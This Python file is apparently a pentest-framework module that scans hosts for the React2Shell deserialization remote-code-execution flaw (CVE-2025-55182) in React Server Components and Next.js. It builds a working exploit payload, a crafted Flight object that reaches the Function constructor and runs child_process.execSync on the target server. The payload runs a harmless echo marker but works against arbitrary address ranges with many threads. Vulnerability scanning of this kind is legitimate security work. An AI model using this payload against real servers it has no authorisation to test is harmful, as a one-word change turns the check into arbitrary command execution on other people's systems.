import json
import ssl
import time
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from core import colors
from core.auxiliary import Auxiliary
from core.check import CheckResult
from core.module import Option
from core.progress import ProgressBar

@dataclass
class HostResult:
    host: str
    state: str = "unknown"
    detail: str = ""
    output: str = ""


class React2ShellScanner(Auxiliary):
    NAME = "React2Shell RSC Flight Deserialization RCE Scanner (CVE-2025-55182)"
    DESCRIPTION = (
        "Detects React Server Components / Next.js applications vulnerable to "
        "the React2Shell RCE (CVE-2025-55182). Sends a crafted Flight protocol "
        "payload to the Server Action endpoint and checks for command output "
        "in the response digest field. Uses a benign echo marker to confirm RCE."
    )
    AUTHOR = "K3ysTr0K3R"
    RANK = "excellent"
    DISCLOSED = "2025-12-03"
    CHECK = True
    REFERENCES = [
        "CVE-2025-55182",
        "https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components",
        "https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3",
        "https://github.com/assetnote/react2shell-scanner",
    ]

    OPTIONS = [
        Option("RHOSTS", required=True,
               description="target(s): host | h1,h2 | CIDR | range | file:path"),
        Option("RPORT", default=3000, type=int, description="HTTP port"),
        Option("SSL", default=False, type=bool, description="use HTTPS"),
        Option("PATH", default="/", description="Server Action endpoint path"),
        Option("TIMEOUT", default=15.0, type=float, description="per-request timeout"),
        Option("THREADS", default=25, type=int, description="concurrent workers"),
        Option("STOP_ON_FIRST", default=False, type=bool,
               description="stop after first vulnerable host"),
    ]

    def _expand_targets(self):
        hosts = self.resolve_targets()
        if not hosts:
            raise ValueError("no targets - set RHOSTS")
        if len(hosts) > 1:
            print(colors.info("target list -> " + str(len(hosts)) + " hosts"))
        return hosts

    def _base_url(self, host):
        scheme = "https" if self.options["SSL"] else "http"
        return scheme + "://" + host + ":" + str(self.options["RPORT"])

    def _build_multipart(self, boundary, fields):
        parts = []
        for name, value in fields.items():
            parts.append("--" + boundary)
            parts.append('Content-Disposition: form-data; name="' + name + '"')
            parts.append("")
            parts.append(value)
        parts.append("--" + boundary + "--")
        parts.append("")
        return "\r\n".join(parts).encode()

    def _probe(self, host):
        marker = "METIS_R2S_" + str(int(time.time()))[-6:]
        js = (
            "var res=process.mainModule.require('child_process')"
            ".execSync('echo " + marker + "',{timeout:5000}).toString().trim();"
            "throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`${res}`});"
        )

        crafted = {
            "then": "$1:__proto__:then",
            "status": "resolved_model",
            "reason": -1,
            "value": '{"then":"$B1337"}',
            "_response": {
                "_prefix": js,
                "_formData": {
                    "get": "$1:constructor:constructor",
                },
            },
        }

        boundary = "----WebKitFormBoundaryMETIS" + str(int(time.time()))
        fields = {
            "0": json.dumps(crafted),
            "1": '"$@0"',
        }
        payload = self._build_multipart(boundary, fields)

        url = self._base_url(host) + self.options["PATH"]
        ctx = ssl._create_unverified_context()
        req = urllib.request.Request(url, data=payload, method="POST")
        req.add_header("User-Agent", "Mozilla/5.0 (metis)")
        req.add_header("Next-Action", "x")
        req.add_header("Content-Type", "multipart/form-data; boundary=" + boundary)

        try:
            with urllib.request.urlopen(req, timeout=self.options["TIMEOUT"], context=ctx) as r:
                body = r.read().decode(errors="replace")
                status = r.status
        except urllib.error.HTTPError as e:
            body = e.read().decode(errors="replace")
            status = e.code
        except urllib.error.URLError as e:
            return HostResult(host, "unknown", type(e).__name__)

        if marker in body:
            return HostResult(host, "vulnerable", "marker echoed", marker)

        if status == 404:
            return HostResult(host, "safe", "endpoint not found")

        if status in (200, 500):
            return HostResult(host, "safe", "HTTP " + str(status) + " no marker")

        return HostResult(host, "safe", "HTTP " + str(status))

    def check(self):
        targets = self._expand_targets()
        host = targets[0]
        print(colors.info("check: probing " + self._base_url(host) + self.options["PATH"]))
        r = self._probe(host)
        if r.state == "vulnerable":
            print(colors.vuln("check: " + host + " vulnerable (" + r.detail + ")"))
            print(colors.dimmed("  marker: " + r.output))
            return CheckResult.VULNERABLE
        if r.state == "safe":
            print(colors.safe("check: " + host + " not vulnerable (" + r.detail + ")"))
            return CheckResult.SAFE
        print(colors.warn("check: " + host + " unknown (" + r.detail + ")"))
        return CheckResult.UNKNOWN

    def action(self):
        targets = self._expand_targets()
        threads = max(1, self.options["THREADS"])
        stop_first = self.options["STOP_ON_FIRST"]

        print(colors.info("scanning " + str(len(targets)) + " host(s) with " + str(threads) + " threads"))
        bar = ProgressBar(total=len(targets), prefix="scan")
        hits = []
        clean = 0
        unknown = 0
        aborted = False

        try:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futures = {ex.submit(self._probe, h): h for h in targets}
                for fut in as_completed(futures):
                    bar.tick()
                    try:
                        r = fut.result()
                    except Exception:
                        unknown += 1
                        continue
                    if r.state == "vulnerable":
                        hits.append(r)
                        bar.log(colors.vuln(r.host + " - " + r.detail))
                        if stop_first:
                            aborted = True
                            for f in futures:
                                f.cancel()
                            break
                    elif r.state == "safe":
                        clean += 1
                    else:
                        unknown += 1
        finally:
            bar.done()

        print()
        print(colors.heading("--- scan summary ---"))
        print("  targets:      " + str(len(targets)))
        print("  vulnerable:   " + colors.green(str(len(hits))))
        print("  not vuln:     " + colors.dimmed(str(clean)))
        print("  unknown:      " + colors.yellow(str(unknown)))
        if aborted:
            print(colors.warn("  scan aborted early (STOP_ON_FIRST)"))
        if hits:
            print(colors.heading("  vulnerable hosts:"))
            for h in hits:
                print("    " + colors.vuln(h.host) + "  " + colors.dimmed(h.detail))

        return hits
